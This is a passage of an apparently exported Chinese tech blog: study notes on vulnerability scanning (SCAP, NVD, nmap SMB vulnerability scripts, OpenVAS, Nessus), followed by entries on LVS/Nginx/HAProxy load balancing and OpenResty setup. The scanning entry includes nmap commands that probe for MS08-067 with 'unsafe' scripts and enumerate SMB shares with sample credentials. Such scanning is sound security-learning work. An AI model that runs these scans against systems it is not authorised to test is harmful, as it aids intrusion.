<li>在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式<br>展现出来，便于配置缺陷评估的可量化操作。<h4 id="CPE（Common-Product-Enumeration）"><a href="#CPE（Common-Product-Enumeration）" class="headerlink" title="CPE（Common Product Enumeration）"></a>CPE（Common Product Enumeration）</h4></li>
<li>信息技术产品、系统、软件包的结构化命名规范，分类命名<h4 id="CWE（Common-Weakness-Enumeration）"><a href="#CWE（Common-Weakness-Enumeration）" class="headerlink" title="CWE（Common Weakness Enumeration）"></a>CWE（Common Weakness Enumeration）</h4></li>
<li>常见漏洞类型的字典，描述不同类型漏洞的特征（访问控制、信息泄露、拒绝服务）<br>Security Content Automation Protocol (SCAP)</li>
<li><ul>
<li>SCAP 是一个集合了多种安全标准框架</li>
</ul>
</li>
<li><ul>
<li>六个元素：CVE、OVAL、CCE、CPE、 CVSS、XCCDF</li>
</ul>
</li>
<li><ul>
<li>目的是以标准的方法展示和操作安全数据</li>
</ul>
</li>
<li><ul>
<li>由NIST负责维护</li>
</ul>
</li>
<li>SCAP主要解决三个问题</li>
<li><ul>
<li>实现高层政策法规等到底层实施的落地（如FISMA，ISO27000系列）</li>
</ul>
</li>
<li><ul>
<li>将信息安全所涉及的各个要素标准化（如统一漏洞的命名及严重性度量）</li>
</ul>
</li>
<li><ul>
<li>将复杂的系统配置核查工作自动化</li>
</ul>
</li>
<li>SCAP是当前美国比较成熟的一套信息安全评估标准体系，其标准化、自动化的思想对信息安全行业产生了深远的影响。</li>
</ul>
<h4 id="NVD（National-Vulnerability-Database）"><a href="#NVD（National-Vulnerability-Database）" class="headerlink" title="NVD（National Vulnerability Database）"></a>NVD（National Vulnerability Database）</h4><ul>
<li>美国政府的漏洞管理标准数据</li>
<li>完全基于SCAP框架</li>
<li>实现自动化漏洞管理、安全测量、合规要求</li>
<li>包含以下库</li>
<li>安全检查列表</li>
<li>软件安全漏洞</li>
<li>配置错误</li>
<li>产品名称</li>
<li>影响度量</li>
<li><a href="https://nvd.nist.gov/" target="_blank" rel="noopener">https://nvd.nist.gov/</a></li>
</ul>
<h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><ul>
<li>nmap 扫描脚本</li>
<li><ul>
<li>400+</li>
</ul>
</li>
<li><ul>
<li>分类</li>
</ul>
</li>
<li>cat /usr/share/nmap/scripts/script.db</li>
<li>grep vuln /usr/share/nmap/scripts/script.db| cut -d “\”” -f 2</li>
<li>cat /usr/share/nmap/scripts/smb-check-vulns.nse</li>
<li>smb-check-vulns.nse</li>
<li><ul>
<li>nmap -sU -sS –script=smb-check-vulns.nse –script-args=unsafe=1 -p U:137,T:139,445 1.1.1.1</li>
</ul>
</li>
<li><ul>
<li>MS08-067<h5 id="smb-vuln-ms10-061-nse"><a href="#smb-vuln-ms10-061-nse" class="headerlink" title="smb-vuln-ms10-061.nse"></a>smb-vuln-ms10-061.nse</h5></li>
</ul>
</li>
<li>Stuxnet蠕虫利用的4个漏洞之一</li>
<li>Print Spooler权限不当，打印请求可在系统目录可创建文件、执行任意代码</li>
<li>LANMAN API枚举共享打印机</li>
<li>远程共享打印机名称</li>
<li>smb-enum-shares枚举共享</li>
<li><ul>
<li>身份认证参数——smbuser、smbpassword</li>
</ul>
</li>
<li><ul>
<li>nmap -p445 –script=smb-enum-shares.nse –script-args=smbuser=admin,smbpassword=pass<br>1.1.1.1</li>
</ul>
</li>
<li>Windows XP,Server 2003 SP2,Vista,Server 2008, win 7<h5 id="其他资料收集"><a href="#其他资料收集" class="headerlink" title="其他资料收集"></a>其他资料收集</h5></li>
<li>简介：NMap也就是Network Mapper，最早是Linux下的网络扫描和嗅探工具包。</li>
<li>中文手册 <a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">链接</a></li>
<li>英文手册 <a href="https://nmap.org/book/man.html" target="_blank" rel="noopener">链接</a></li>
<li>优秀博客：</li>
<li><ul>
<li><a href="https://www.cnblogs.com/nmap/p/6232207.html" target="_blank" rel="noopener">nmap命令—–基础用法</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://www.cnblogs.com/nmap/p/6232969.html" target="_blank" rel="noopener">nmap命令—–高级用法</a></li>
</ul>
</li>
</ul>
<h2 id="OPENVAS相关"><a href="#OPENVAS相关" class="headerlink" title="OPENVAS相关"></a>OPENVAS相关</h2><p>OpenVAS 是开放式漏洞评估系统，也可以说它是一个包含着相关工具的网络扫描器。其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。</p>
<p>用户需要一种自动测试的方法，并确保正在运行一种最恰当的最新测试。OpenVAS 包括一个中央服务器和一个图形化的前端。这个服务器准许用户运行 几种不同的网络漏洞测试（以 Nessus 攻击脚本语言编写），而且 OpenVAS 可以经常对其进行更新。OpenVAS 所有的代码都符合 GPL 规范。</p>
<h3 id="构造图："><a href="#构造图：" class="headerlink" title="构造图："></a>构造图：</h3><p><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/openvas.png" alt="结构图"></p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><h4 id="OpenVAS-Manager"><a href="#OpenVAS-Manager" class="headerlink" title="OpenVAS Manager"></a>OpenVAS Manager</h4><ul>
<li>控制scanner和其他manager的中心组件</li>
<li>控制中心数据库，保存用户配置及扫描结果</li>
<li>客户端使用基于XML的无状态OMP协议与其通信</li>
<li>集中排序筛选，使客户端获得一致展现<h4 id="OpenVAS-Scanner"><a href="#OpenVAS-Scanner" class="headerlink" title="OpenVAS Scanner"></a>OpenVAS Scanner</h4></li>
<li>具体执行Network Vulnerability Tests （NVTs）</li>
<li>NVTs 每天通过 Feed 更新</li>
<li>受 Manager 控制<h4 id="OSP-Scanner"><a href="#OSP-Scanner" class="headerlink" title="OSP Scanner"></a>OSP Scanner</h4></li>
<li>可以统一管理多个scanner</li>
<li>将一组 scanner 作为一个对象交给manager管理<h4 id="Greenbone-Security-Assistant-GSA"><a href="#Greenbone-Security-Assistant-GSA" class="headerlink" title="Greenbone Security Assistant (GSA)"></a>Greenbone Security Assistant (GSA)</h4></li>
<li>提供 Web service<h4 id="OpenVAS-CLI"><a href="#OpenVAS-CLI" class="headerlink" title="OpenVAS CLI"></a>OpenVAS CLI</h4></li>
<li>omp 命令行工具，可实现批处理控制 manager<h4 id="更新很快"><a href="#更新很快" class="headerlink" title="更新很快"></a>更新很快</h4></li>
<li>所有找得到的资料几乎都已不同程度的过时了</li>
</ul>
<h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><p>安装</p>
<ul>
<li>初始化安装</li>
<li>openvas-setup</li>
<li>检查安装结果</li>
<li>openvas-check-setup</li>
<li>查看当前账号</li>
<li>openvasmd–list-users</li>
<li>修改账号密码</li>
<li>openvasmd–user=admin –new-password=Passw0rd</li>
<li>升级</li>
<li>openvas-feed-update<br>创建证书<br>同步弱点数据库<br>创建客户端证书<br>重建数据库<br>备份数据库<br>启动服务装入插件<br>创建管理员账号<br>创建普通用户账号<br>配置服务侦听端口<br>安装验证</li>
</ul>
<h2 id="NESSUS"><a href="#NESSUS" class="headerlink" title="NESSUS"></a>NESSUS</h2><ul>
<li>家庭版</li>
<li><ul>
<li>免费</li>
</ul>
</li>
<li>专业版</li>
<li><ul>
<li>收费、无限的并发连接<h4 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h4></li>
</ul>
</li>
<li><a href="http://www.tenable.com/products/nessus/select-your-operating-system" target="_blank" rel="noopener">http://www.tenable.com/products/nessus/select-your-operating-system</a><h4 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h4></li>
<li><ul>
<li>dpkg –i</li>
</ul>
</li>
<li>安装路径：</li>
<li><ul>
<li>/opt/nessus<h4 id="3-启动服务"><a href="#3-启动服务" class="headerlink" title="3.启动服务"></a>3.启动服务</h4></li>
</ul>
</li>
<li><ul>
<li>/etc/init.d/nessusd start<h4 id="4-管理地址"><a href="#4-管理地址" class="headerlink" title="4.管理地址"></a>4.管理地址</h4></li>
</ul>
</li>
<li><a href="https://127.0.0.1:8834" target="_blank" rel="noopener">https://127.0.0.1:8834</a><h4 id="5-注册激活码"><a href="#5-注册激活码" class="headerlink" title="5.注册激活码"></a>5.注册激活码</h4></li>
<li><a href="http://www.tenable.com/products/nessus-home" target="_blank" rel="noopener">http://www.tenable.com/products/nessus-home</a><h4 id="6-管理账号"><a href="#6-管理账号" class="headerlink" title="6.管理账号"></a>6.管理账号</h4></li>
<li>更新插件<h4 id="7-基本配置（setting）"><a href="#7-基本配置（setting）" class="headerlink" title="7.基本配置（setting）"></a>7.基本配置（setting）</h4></li>
<li>升级</li>
<li>账号</li>
<li>SMTP</li>
<li>代理<h4 id="8-实战"><a href="#8-实战" class="headerlink" title="8.实战"></a>8.实战</h4></li>
<li>策略</li>
<li>扫描</li>
<li>扫描本机</li>
<li>扫描windows</li>
<li>扫描linux</li>
<li>扫描网络设备</li>
<li>扫描web server</li>
<li>报告</li>
<li>调度</li>
</ul>
<h2 id="openvas、nessus实战笔记"><a href="#openvas、nessus实战笔记" class="headerlink" title="openvas、nessus实战笔记"></a>openvas、nessus实战笔记</h2><h3 id="好教程"><a href="#好教程" class="headerlink" title="好教程"></a>好教程</h3><p>大学霸 Kali Linux 安全渗透教程：<a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/28.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/28.html</a></p>
<h3 id="个人笔记"><a href="#个人笔记" class="headerlink" title="个人笔记"></a>个人笔记</h3><p>nessus 版本分linux和win，在linux版本中针对不同内核、不同处理器，版本也各部相同。<br>首次使用注意保存启动命令方式。（见上文）<br>创建目标主机，步骤很简单，很容易上手。<br>扫描之前创建一个靶机，用于漏洞扫描，靶机推荐 Metasploitable 操作系统，该操作系统存在大量未修补漏洞。<br>实战：<br>扫描了虚拟机的靶机和自己的两台服务器，效果明显，针对高版本服务器，漏洞的出现率非常低。</p>
<p>openvas  一直出现404错误，原因不知。尝试了下，可以用，体验不是太好。提供ssh与不提供ssh效果明显不同。</p>
<h5 id="用到的链接："><a href="#用到的链接：" class="headerlink" title="用到的链接："></a>用到的链接：</h5><p><a href="https://blog.csdn.net/qq_35983015/article/details/79325463" target="_blank" rel="noopener">Linux安装Nessus的详细操作</a><br><a href="https://www.cnblogs.com/yxwkf/p/5348042.html" target="_blank" rel="noopener">win下的Nessus漏洞扫描教程之配置Nessus</a></p>
<h5 id="漏洞的处理："><a href="#漏洞的处理：" class="headerlink" title="漏洞的处理："></a>漏洞的处理：</h5><p><a href="https://www.jb51.net/article/33938.htm" target="_blank" rel="noopener">如何关闭http Methods中的Trace 提高安全意识</a></p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>kali</tag>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-负载均衡</title>
    <url>/Linux-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
    <content><![CDATA[<h2 id="LVS三种模式的工作过程"><a href="#LVS三种模式的工作过程" class="headerlink" title="LVS三种模式的工作过程"></a>LVS三种模式的工作过程</h2><p>LVS 有三种负载均衡的模式，分别是VS/NAT（nat 模式） VS/DR(路由模式) VS/TUN（隧道模式）</p>
<p>一、NAT模式（VS-NAT）</p>
<p>原理：就是把客户端发来的数据包的IP头的目的地址，在负载均衡器上换成其中一台RS的IP地址<br>并发至此RS来处理,RS处理完后把数据交给负载均衡器,负载均衡器再把数据包原IP地址改为自己的IP<br>将目的地址改为客户端IP地址即可期间,无论是进来的流量,还是出去的流量,都必须经过负载均衡器<br>优点：集群中的物理服务器可以使用任何支持TCP/IP操作系统，只有负载均衡器需要一个合法的IP地址<br>缺点：扩展性有限。当服务器节点（普通PC服务器）增长过多时,负载均衡器将成为整个系统的瓶颈<br>因为所有的请求包和应答包的流向都经过负载均衡器。当服务器节点过多时<br>大量的数据包都交汇在负载均衡器那，速度就会变慢！<br><a id="more"></a><br>二、IP隧道模式（VS-TUN）</p>
<p>原理：首先要知道，互联网上的大多Internet服务的请求包很短小，而应答包通常很大<br>那么隧道模式就是，把客户端发来的数据包，封装一个新的IP头标记(仅目的IP)发给RS<br>RS收到后,先把数据包的头解开,还原数据包,处理后,直接返回给客户端,不需要再经过<br>负载均衡器。注意,由于RS需要对负载均衡器发过来的数据包进行还原,所以说必须支持<br>IPTUNNEL协议，所以,在RS的内核中,必须编译支持IPTUNNEL这个选项<br>优点：负载均衡器只负责将请求包分发给后端节点服务器，而RS将应答包直接发给用户<br>所以，减少了负载均衡器的大量数据流动，负载均衡器不再是系统的瓶颈，就能处理很巨大的请求量<br>这种方式，一台负载均衡器能够为很多RS进行分发。而且跑在公网上就能进行不同地域的分发。<br>缺点：隧道模式的RS节点需要合法IP，这种方式需要所有的服务器支持”IP Tunneling”<br>(IP Encapsulation)协议，服务器可能只局限在部分Linux系统上</p>
<p>三、直接路由模式（VS-DR）</p>
<p>原理：负载均衡器和RS都使用同一个IP对外服务但只有DR对ARP请求进行响应<br>所有RS对本身这个IP的ARP请求保持静默也就是说,网关会把对这个服务IP的请求全部定向给DR<br>而DR收到数据包后根据调度算法,找出对应的RS,把目的MAC地址改为RS的MAC（因为IP一致）<br>并将请求分发给这台RS这时RS收到这个数据包,处理完成之后，由于IP一致，可以直接将数据返给客户<br>则等于直接从客户端收到这个数据包无异,处理后直接返回给客户端<br>由于负载均衡器要对二层包头进行改换,所以负载均衡器和RS之间必须在一个广播域<br>也可以简单的理解为在同一台交换机上<br>优点：和TUN（隧道模式）一样，负载均衡器也只是分发请求，应答包通过单独的路由方法返回给客户端<br>与VS-TUN相比，VS-DR这种实现方式不需要隧道结构，因此可以使用大多数操作系统做为物理服务器。<br>缺点：（不能说缺点，只能说是不足）要求负载均衡器的网卡必须与物理网卡在一个物理段上。</p>
<h2 id="lvs-nginx-haproxy优缺点"><a href="#lvs-nginx-haproxy优缺点" class="headerlink" title="lvs/nginx/haproxy优缺点"></a>lvs/nginx/haproxy优缺点</h2><p>Nginx的优点是：<br>1、工作在网络的7层之上，可以针对http应用做一些分流的策略，比如针对域名、目录结构，它的正则规则比HAProxy更为强大和灵活，这也是它目前广泛流行的主要原因之一，Nginx单凭这点可利用的场合就远多于LVS了。</p>
<p>2、Nginx对网络稳定性的依赖非常小，理论上能ping通就就能进行负载功能，这个也是它的优势之一，相反LVS对网络稳定性依赖比较大，这点本人深有体会；</p>
<p>3、Nginx安装和配置比较简单，测试起来比较方便，它基本能把错误用日志打印出来，LVS的配置、测试就要花比较长的时间了，LVS对网络依赖比较大。</p>
<p>4、可以承担高负载压力且稳定，在硬件不差的情况下一般能支撑几万次的并发量，负载度比LVS相对小些。</p>
<p>5、Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点，不过其中缺点就是不支持url来检测。比如用户正在上传一个文件，而处理该上传的节点刚好在上传过程中出现故障，Nginx会把上传切到另一台服务器重新处理，而LVS就直接断掉了，如果是上传一个很大的文件或者很重要的文件的话，用户可能会因此而不满。</p>
<p>6、Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器，LNMP也是近几年非常流行的web架构，在高流量的环境中稳定性也很好。</p>
<p>7、Nginx现在作为Web反向加速缓存越来越成熟了，速度比传统的Squid服务器更快，可考虑用其作为反向代理加速器</p>
<p>8、Nginx可作为中层反向代理使用，这一层面Nginx基本上无对手，唯一可以对比Nginx的就只有lighttpd了，不过lighttpd目前还没有做到Nginx完全的功能，配置也不那么清晰易读，社区资料也远远没Nginx活跃</p>
<p>9、Nginx也可作为静态网页和图片服务器，这方面的性能也无对手。还有Nginx社区非常活跃，第三方模块也很多</p>
<p>Nginx的缺点是：</p>
<p>1、Nginx仅能支持http、https和Email协议，这样就在适用范围上面小些，这个是它的缺点<br>2、对后端服务器的健康检查，只支持通过端口来检测，不支持通过url来检测<br>     不支持Session的直接保持，但能通过ip_hash来解决</p>
<p>LVS：使用Linux内核集群实现一个高性能、高可用的负载均衡服务器，它具有很好的可伸缩性（Scalability)、可靠性（Reliability)和可管理性（Manageability)</p>
<p>LVS的优点是：</p>
<p>1、抗负载能力强、是工作在网络4层之上仅作分发之用，没有流量的产生，这个特点也决定了它在负载均衡软件里的性能最强的，对内存和cpu资源消耗比较低</p>
<p>2、配置性比较低，这是一个缺点也是一个优点，因为没有可太多配置的东西，所以并不需要太多接触，大大减少了人为出错的几率</p>
<p>3、工作稳定，因为其本身抗负载能力很强，自身有完整的双机热备方案，如LVS+Keepalived，不过我们在项目实施中用得最多的还是LVS/DR+Keepalived</p>
<p>4、无流量，LVS只分发请求，而流量并不从它本身出去，这点保证了均衡器IO的性能不会收到大流量的影响。</p>
<p>5、应用范围较广，因为LVS工作在4层，所以它几乎可对所有应用做负载均衡，包括http、数据库、在线聊天室等</p>
<p>LVS的缺点是：</p>
<p>1、软件本身不支持正则表达式处理，不能做动静分离<br>     而现在许多网站在这方面都有较强的需求，这个是Nginx/HAProxy+Keepalived的优势所在<br>2、如果是网站应用比较庞大的话，LVS/DR+Keepalived实施起来就比较复杂了，特别后面有Windows Server的机器的话，如果实施及配置还有维护过程就比较复杂了，相对而言，Nginx/HAProxy+Keepalived就简单多了。</p>
<p>HAProxy的特点是：</p>
<p>1、HAProxy也是支持虚拟主机的。</p>
<p>2、HAProxy的优点能够补充Nginx的一些缺点，比如支持Session的保持，Cookie的引导，同时支持通过获取指定的url来检测后端服务器的状态</p>
<p>3、HAProxy跟LVS类似，本身就只是一款负载均衡软件，单纯从效率上来讲HAProxy会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的</p>
<p>4、HAProxy支持TCP协议的负载均衡转发，可以对MySQL读进行负载均衡，对后端的MySQL节点进行检测和负载均衡，大家可以用LVS+Keepalived对MySQL主从做负载均衡</p>
<p>5、HAProxy负载均衡策略非常多，HAProxy的负载均衡算法现在具体有如下8种：</p>
<p>①roundrobin，表示简单的轮询，这个不多说，这个是负载均衡基本都具备的；<br>② static-rr，表示根据权重，建议关注；<br>③leastconn，表示最少连接者先处理，建议关注；<br>④ source，表示根据请求源IP，这个跟Nginx的IP_hash机制类似<br>    我们用其作为解决session问题的一种方法，建议关注；<br>⑤ri，表示根据请求的URI；<br>⑥rl_param，表示根据请求的URl参数’balance url_param’ requires an URL parameter name；<br>⑦hdr(name)，表示根据HTTP请求头来锁定每一次HTTP请求；<br>⑧rdp-cookie(name)，表示根据据cookie(name)来锁定并哈希每一次TCP请求。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenResty从入门到实战笔记</title>
    <url>/OpenResty%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://openresty.org/en/linux-packages.html" target="_blank" rel="noopener">官方教程</a></p>
<p>ubuntu 实践：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># import our GPG key:</span><br><span class="line">wget -qO - https://openresty.org/package/pubkey.gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line"># for installing the add-apt-repository command</span><br><span class="line"># (you can remove this package and its dependencies later):</span><br><span class="line">sudo apt-get -y install software-properties-common</span><br><span class="line"></span><br><span class="line"># add the our official APT repository:</span><br><span class="line">sudo add-apt-repository -y &quot;deb http://openresty.org/package/ubuntu $(lsb_release -sc) main&quot;</span><br><span class="line"></span><br><span class="line"># to update the APT index:</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install openresty</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<h3 id="官网直通车"><a href="#官网直通车" class="headerlink" title="官网直通车"></a>官网直通车</h3><p><a href="https://openresty.org/cn/" target="_blank" rel="noopener">中文官网主页</a></p>
<p><a href="http://openresty.org/cn/rpm-packages.html" target="_blank" rel="noopener">OpenResty 官方 Yum 资源库提供下面的 RPM 包</a></p>
<p><a href="https://note.youdao.com/ynoteshare1/index.html?id=965c9f034a82ffb0f8b4de6ca81f3e73&amp;type=note" target="_blank" rel="noopener">NginxLuaModule 源码分析－某不知名大佬有道云笔记</a></p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h3 id="第一个实例"><a href="#第一个实例" class="headerlink" title="第一个实例"></a>第一个实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resty -e &apos;print(&quot;hello, world&quot;)&apos;</span><br><span class="line"></span><br><span class="line">    hello, world</span><br></pre></td></tr></table></figure>
<h3 id="准备目录布局"><a href="#准备目录布局" class="headerlink" title="准备目录布局"></a>准备目录布局</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先实践一个简单的</span><br><span class="line">mkdir ~/work</span><br><span class="line">cd ~/work</span><br><span class="line">mkdir logs/ conf/</span><br><span class="line"></span><br><span class="line">我们还为日志文件创建了 logs / 目录，为配置文件创建了 conf / 。</span><br></pre></td></tr></table></figure>
<p>logs/error.log</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim 造一个空文件</span><br></pre></td></tr></table></figure>
<p>conf/nginx.conf </p>
<p>下面是不同的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官方：</span><br><span class="line"></span><br><span class="line">worker_processes  1;</span><br><span class="line">error_log logs/error.log;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 8080;</span><br><span class="line">        location / &#123;</span><br><span class="line">            default_type text/html;</span><br><span class="line">            content_by_lua_block &#123;</span><br><span class="line">                ngx.say(&quot;&lt;p&gt;hello, world&lt;/p&gt;&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">极客时间：</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 8080;</span><br><span class="line">        location / &#123;</span><br><span class="line">            content_by_lua &apos;</span><br><span class="line">                ngx.say(&quot;hello, world&quot;)</span><br><span class="line">            &apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">极客时间：</span><br><span class="line"></span><br><span class="line">pid logs/nginx.pid;</span><br><span class="line">events &#123;</span><br><span class="line">	worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">	server &#123;</span><br><span class="line">		listen 8080;</span><br><span class="line">		location / &#123;</span><br><span class="line">			content_by_lua_file lua/hello.lua;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="启动-Nignx-服务器"><a href="#启动-Nignx-服务器" class="headerlink" title="启动 Nignx 服务器"></a>启动 Nignx 服务器</h3><p>/usr/local/openresty (this is the default)</p>
<p>确定路径正确</p>
<p>环境变量设置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PATH=/usr/local/openresty/nginx/sbin:$PATH</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure></p>
<p>启动：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx -p `pwd`/ -c conf/nginx.conf</span><br><span class="line"></span><br><span class="line">curl http://localhost:8080/</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;hello, world&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
<p>###　结构介绍<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/local/openresty/lualib$ ls</span><br><span class="line"></span><br><span class="line">drwxr-xr-x  5 root root  4096 6月  17 22:04 ./</span><br><span class="line">drwxr-xr-x 10 root root  4096 6月  17 22:04 ../</span><br><span class="line">-rw-r--r--  1 root root 39464 5月  17 07:33 cjson.so</span><br><span class="line">-rw-r--r--  1 root root  5848 5月  17 07:33 librestysignal.so</span><br><span class="line">drwxr-xr-x  3 root root  4096 6月  17 22:04 ngx/</span><br><span class="line">drwxr-xr-x  2 root root  4096 6月  17 22:04 redis/</span><br><span class="line">drwxr-xr-x  8 root root  4096 6月  17 22:04 resty/</span><br><span class="line">-rw-r--r--  1 root root  1374 5月  17 07:33 tablepool.lua</span><br><span class="line"></span><br><span class="line">ngx: 存放的是 lua-resty-core 这个官方项目中的 Lua 代码，里面都是基于 FFI 重新实现的 OpenResty API</span><br><span class="line"></span><br><span class="line">resty: 存放的则是各种 lua-resty-* 项目包含的 Lua 代码</span><br><span class="line"></span><br><span class="line">PS: </span><br><span class="line">早期的 OpenResty 同时带有 Lua 和 LuaJIT，你可以通过编译选项，来决定使用 Lua 还是 LuaJIT。不过到了现在，Lua 逐渐被淘汰，就只支持更高性能的 LuaJIT 了。</span><br></pre></td></tr></table></figure></p>
<h4 id="OpenResty-项目概览"><a href="#OpenResty-项目概览" class="headerlink" title="OpenResty 项目概览"></a>OpenResty 项目概览</h4><p><a href="https://github.com/openresty/" target="_blank" rel="noopener">OpenResty 包含了 68 个公开的项目</a></p>
<h5 id="NGINX-C-模块"><a href="#NGINX-C-模块" class="headerlink" title="NGINX C 模块"></a>NGINX C 模块</h5><p>OpenResty 中一共包含了 20 多个 C 模块，我们在本节最开始使用的 openresty -V 中，也可以看到这些 C 模块：</p>
<p>–add-module=后面跟着的，就是 OpenResty 的 C 模块。其中，最核心的就是 lua-nginx-module 和 stream-lua-nginx-module，前者用来处理七层流量，后者用来处理四层流量。</p>
<p>这些 C 模块中，有些是需要特别注意的，虽然默认编译进入了 OpenResty，但并不推荐使用。 </p>
<p>lua 是未来，其他项目大多处于疏于维护状态。</p>
<h5 id="lua-resty-周边库"><a href="#lua-resty-周边库" class="headerlink" title="lua-resty- 周边库"></a>lua-resty- 周边库</h5><p>OpenResty 官方仓库中包含 18 个 lua-resty-* 库，涵盖 Redis、MySQL、memcached、websocket、dns、流量控制、字符串处理、进程内缓存等常用库。</p>
<p>了官方自带的之外，还有更多的第三方库。</p>
<h5 id="自己维护的-LuaJIT-分支"><a href="#自己维护的-LuaJIT-分支" class="headerlink" title="自己维护的 LuaJIT 分支"></a>自己维护的 LuaJIT 分支</h5><p><a href="https://github.com/openresty/luajit2" target="_blank" rel="noopener"> LuaJIT 分支</a></p>
<p>OpenResty 除了维护自己的 OpenSSL patch 外，还维护了自己的 LuaJIT 分支。</p>
<p>相对于 Lua，LuaJIT 增加了不少独有的函数，这些函数非常重要</p>
<h5 id="测试框架"><a href="#测试框架" class="headerlink" title="测试框架"></a>测试框架</h5><p><a href="https://github.com/openresty/test-nginx" target="_blank" rel="noopener"> Perl 语言来开发的 test-nginx</a>:OpenResty 官方的所有 C 模块和 lua-resty 库的测试案例，都是由 test-nginx 驱动的。</p>
<p><a href="https://github.com/openresty/mockeagain" target="_blank" rel="noopener">可以模拟慢速的网络的　mockeagain </a>:让程序每次只读写一个字节。</p>
<h5 id="调试工具链"><a href="#调试工具链" class="headerlink" title="调试工具链"></a>调试工具链</h5><p><a href="https://openresty.org/posts/dynamic-tracing/" target="_blank" rel="noopener">动态追踪技术漫谈</a></p>
<p>使用 systemtap 最大的优势，便是实现活体分析，同时对目标程序完全无侵入。</p>
<p><a href="https://github.com/openresty/openresty-systemtap-toolkit" target="_blank" rel="noopener">openresty-systemtap-toolkit</a></p>
<p><a href="https://github.com/openresty/stapxx" target="_blank" rel="noopener">stapxx </a></p>
<h5 id="打包相关"><a href="#打包相关" class="headerlink" title="打包相关"></a>打包相关</h5><p><a href="https://github.com/openresty/openresty-packaging" target="_blank" rel="noopener">openresty-packaging </a></p>
<p><a href="https://github.com/openresty/homebrew-brew" target="_blank" rel="noopener">home-brew</a></p>
<h5 id="工程化工具"><a href="#工程化工具" class="headerlink" title="工程化工具"></a>工程化工具</h5><p><a href="https://github.com/openresty/openresty-devel-utils" target="_blank" rel="noopener">Perl 开发的 OpenResty 和 NGINX 的工具集 openresty-devel-utils</a></p>
<p>lj-releng 是一个简单有效的 LuaJIT 代码检测工具，类似 luacheck，可以找出全局变量等潜在的问题。</p>
<p>reindex 从名字来看是重建索引的意思，它其实是格式化 test-nginx 测试案例的工具，可以重新排列测试案例的编号，以及去除多余的空白符。reindex 可以说是 OpenResty 开发者每天都会用到的工具之一。</p>
<p>opsboy 也是一个深藏不露的项目，主要用于自动化部署。OpenResty 每次发布版本前，都会在 AWS EC2 集群上做完整的回归测试，详细的文档你可以参考官方文档，而这个回归测试正是由 opsboy 来部署和驱动的。opsboy 是一个用 Perl 实现的 DSL（领域特定语言）。</p>
